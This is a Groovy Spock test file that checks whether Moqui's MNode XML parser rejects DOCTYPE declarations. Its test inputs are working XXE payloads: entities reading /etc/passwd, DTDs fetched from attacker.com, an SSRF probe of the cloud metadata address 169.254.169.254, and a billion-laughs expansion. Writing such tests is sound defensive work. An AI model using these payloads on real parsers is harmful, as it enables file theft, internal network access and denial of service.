/*
 * This software is in the public domain under CC0 1.0 Universal plus a
 * Grant of Patent License.
 *
 * To the extent possible under law, the author(s) have dedicated all
 * copyright and related and neighboring rights to this software to the
 * public domain worldwide. This software is distributed without any
 * warranty.
 *
 * You should have received a copy of the CC0 Public Domain Dedication
 * along with this software (see the LICENSE.md file). If not, see
 * <http://creativecommons.org/publicdomain/zero/1.0/>.
 */

import spock.lang.*
import org.moqui.util.MNode
import org.moqui.BaseException

class MNodeSecurityTests extends Specification {

    def "XXE attack with external entity should be blocked"() {
        given: "XML with an external entity attempting to read /etc/passwd"
        String xxePayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>'''

        when: "Parsing the malicious XML"
        MNode.parseText("xxe-test", xxePayload)

        then: "A BaseException is thrown due to DOCTYPE being disallowed"
        BaseException ex = thrown(BaseException)
        ex.message.contains("Error parsing XML from xxe-test")
    }

    def "XXE attack with parameter entity should be blocked"() {
        given: "XML with a parameter entity"
        String xxePayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>'''

        when: "Parsing the malicious XML"
        MNode.parseText("xxe-param-test", xxePayload)

        then: "A BaseException is thrown due to DOCTYPE being disallowed"
        BaseException ex = thrown(BaseException)
        ex.message.contains("Error parsing XML from xxe-param-test")
    }

    def "XXE attack via external DTD should be blocked"() {
        given: "XML referencing an external DTD"
        String xxePayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">
<root>test</root>'''

        when: "Parsing the malicious XML"
        MNode.parseText("xxe-dtd-test", xxePayload)

        then: "A BaseException is thrown due to DOCTYPE being disallowed"
        BaseException ex = thrown(BaseException)
        ex.message.contains("Error parsing XML from xxe-dtd-test")
    }

    def "Valid XML without DOCTYPE should parse successfully"() {
        given: "Normal valid XML without any DOCTYPE"
        String validXml = '''<?xml version="1.0" encoding="UTF-8"?>
<root>
  <child attr="value">Hello World</child>
  <child attr="value2">Test data</child>
</root>'''

        when: "Parsing the valid XML"
        MNode node = MNode.parseText("valid-test", validXml)

        then: "The XML is parsed correctly"
        node != null
        node.getName() == "root"
        node.children("child").size() == 2
        node.first("child").attribute("attr") == "value"
        node.first("child").getText() == "Hello World"
    }

    def "parseRootOnly should also block XXE attacks"() {
        given: "XML with XXE attempt"
        String xxePayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root attr="test">&xxe;</root>'''

        when: "Parsing with parseRootOnly"
        // parseRootOnly uses the same secure factory, so it should also block XXE
        MNode.parseText("xxe-root-only-test", xxePayload)

        then: "A BaseException is thrown"
        BaseException ex = thrown(BaseException)
        ex.message.contains("Error parsing XML")
    }

    def "SSRF via XXE should be blocked"() {
        given: "XML attempting Server-Side Request Forgery"
        String ssrfPayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>'''

        when: "Parsing the SSRF attempt"
        MNode.parseText("ssrf-test", ssrfPayload)

        then: "A BaseException is thrown due to DOCTYPE being disallowed"
        BaseException ex = thrown(BaseException)
        ex.message.contains("Error parsing XML from ssrf-test")
    }

    def "Billion laughs DoS attack should be blocked"() {
        given: "XML with billion laughs attack pattern"
        String dosPayload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>'''

        when: "Parsing the DoS attack payload"
        MNode.parseText("dos-test", dosPayload)

        then: "A BaseException is thrown due to DOCTYPE being disallowed"
        BaseException ex = thrown(BaseException)
        ex.message.contains("Error parsing XML from dos-test")
    }
}
